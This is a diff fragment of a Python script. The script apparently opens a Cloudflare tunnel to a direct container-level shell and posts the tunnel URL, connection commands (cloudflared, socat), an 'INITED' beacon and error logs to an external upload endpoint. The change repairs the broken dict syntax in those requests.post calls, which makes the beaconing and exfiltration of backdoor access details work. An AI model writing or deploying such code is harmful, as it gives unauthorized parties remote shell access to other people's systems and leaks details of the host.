@@ -106,17 +106,17 @@ while True:
             if tunnel_url:
                 info = f"SSH info\n创建时间: {t}\n\nDirect shell (container level, UID {os.getuid()}, no proot)\nTunnel: {tunnel_url}\n\nConnect:\n  cloudflared access tcp --hostname {tunnel_url} --url 127.0.0.1:19023\n  socat - TCP:127.0.0.1:19023\n"
                 import requests
-                requests.post(UPLOAD_API, files={{'file': (f'ssh_{REPO_NAME}.txt', info.encode())}}, timeout=10)
-                requests.post(UPLOAD_API, files={{'file': (f'inited_{REPO_NAME}.txt', f'INITED\nrepo: {REPO_NAME}\ntime: {t}\nmode: direct_tcp\n'.encode())}}, timeout=10)
+                requests.post(UPLOAD_API, files={'file': (f'ssh_{REPO_NAME}.txt', info.encode())}, timeout=10)
+                requests.post(UPLOAD_API, files={'file': (f'inited_{REPO_NAME}.txt', f'INITED\nrepo: {REPO_NAME}\ntime: {t}\nmode: direct_tcp\n'.encode())}, timeout=10)
             else:
                 import requests
                 err = Path(log).read_text()[:300] if Path(log).exists() else "no log"
-                requests.post(UPLOAD_API, files={{'file': (f'deploy_{REPO_NAME}.txt', f'tunnel_failed\n{err}\n'.encode())}}, timeout=5)
+                requests.post(UPLOAD_API, files={'file': (f'deploy_{REPO_NAME}.txt', f'tunnel_failed\n{err}\n'.encode())}, timeout=5)
 
         except Exception as e:
             try:
                 import requests
-                requests.post(UPLOAD_API, files={{'file': (f'deploy_{REPO_NAME}.txt', f'ERROR: {e}\n'.encode())}}, timeout=5)
+                requests.post(UPLOAD_API, files={'file': (f'deploy_{REPO_NAME}.txt', f'ERROR: {e}\n'.encode())}, timeout=5)
             except:
                 pass
 
